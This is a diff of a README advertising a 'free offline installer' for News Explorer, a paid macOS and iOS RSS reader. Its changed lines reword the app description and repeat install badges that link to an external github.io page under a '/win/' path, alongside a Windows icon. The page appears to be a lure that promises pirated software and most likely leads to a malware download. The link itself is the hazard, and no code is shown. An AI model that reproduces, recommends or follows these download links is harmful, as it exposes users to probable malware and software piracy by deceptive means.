@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-RSS+Reader-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 News Explorer Free Installer** — News Explorer is a macOS and iOS RSS and Atom news aggregator with iCloud sync across Apple devices. Works without internet access, no account required. Full offline installation.
+**💻 News Explorer Free Installer** — News Explorer is a macOS and iOS RSS and Atom feed reader with iCloud sync for keeping read articles synchronized across Mac, iPhone, and iPad. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install News Explorer](https://img.shields.io/badge/⬇_Install_News%20Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install News Explorer](https://img.shields.io/badge/⬇_Install_News+Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About News Explorer
 
-News Explorer is a macOS and iOS RSS and Atom news aggregator with iCloud sync across Apple devices. It provides a clean reading interface, JSON Feed support, and a native macOS design — a polished alternative to Reeder for Apple ecosystem users.
+News Explorer is a macOS and iOS RSS and Atom feed reader with iCloud sync for keeping read articles synchronized across Mac, iPhone, and iPad. Features a three-panel interface, full article reading view, article sharing, and Fever/Feedly/NewsBlur sync. News Explorer's native macOS design and iCloud integration make it a clean choice for Apple-platform users following RSS feeds.
 
 ---
 
 ## ❌ Problem: News Explorer is hard to access
 
-- **Apple Ecosystem Only** — No Windows or Android version
-- **Paid App** — Requires purchase on both macOS and iOS
-- **Limited Sharing** — Fewer sharing integrations than Reeder or NetNewsWire
-- **iCloud Sync Only** — No sync with web-based RSS services like Feedbin
+- **Apple Only** — macOS and iOS only; no Windows or Android version
+- **Commercial License** — Paid application
+- **iCloud Dependency** — Sync features require iCloud account
+- **Third-Party Sync** — Third-party sync services work but less seamlessly than iCloud
 
 ---
 
@@ -81,7 +81,7 @@ News Explorer is a macOS and iOS RSS and Atom news aggregator with iCloud sync a
 
 <div align="center">
 
-[![⬇ Install News Explorer](https://img.shields.io/badge/⬇_Install_News%20Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install News Explorer](https://img.shields.io/badge/⬇_Install_News+Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ News Explorer is a macOS and iOS RSS and Atom news aggregator with iCloud sync a
 
 ---
 
-**News Explorer Free Installer** — News Explorer is a macOS and iOS RSS and Atom news aggregator with iCloud sync across Apple devices. Install without internet connection today!
+**News Explorer Free Installer** — News Explorer is a macOS and iOS RSS and Atom feed reader with iCloud sync for keeping read articles synchronized across Mac, iPhone, and iPad. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install News Explorer](https://img.shields.io/badge/⬇_Install_News%20Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install News Explorer](https://img.shields.io/badge/⬇_Install_News+Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
